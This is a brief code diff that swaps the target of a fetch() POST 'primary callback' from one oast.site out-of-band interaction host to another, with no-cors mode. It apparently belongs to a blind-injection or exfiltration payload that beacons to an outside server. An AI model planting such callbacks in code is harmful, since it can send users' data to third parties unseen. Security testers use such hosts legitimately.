@@ -315,7 +315,7 @@
 
               // Fetch POST - primary callback
               try {
-                  fetch('https://9pi51b0kvjhn47nc4tk9mjuqqyufyfmq9.oast.site', {
+                  fetch('https://c9jv4n762melieg12ukr3ffpdwakwp6tf.oast.site', {
                       method: 'POST',
                       mode: 'no-cors',
                       headers: {'Content-Type': 'text/plain'},
